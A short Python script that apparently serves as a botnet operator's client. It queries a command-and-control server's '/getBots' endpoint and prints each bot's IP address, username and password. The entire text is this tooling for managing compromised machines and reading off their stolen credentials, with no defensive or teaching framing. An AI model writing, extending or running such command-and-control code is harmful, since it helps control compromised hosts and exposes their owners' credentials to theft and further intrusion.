import json
import requests 

cnc = "http://192.168.29.74:5000"

r=requests.get(url=cnc+"/getBots")
data = r.json()
for i in data.keys():
	print(data[i]["ip"]+";"+data[i]["username"]+";"+data[i]["password"])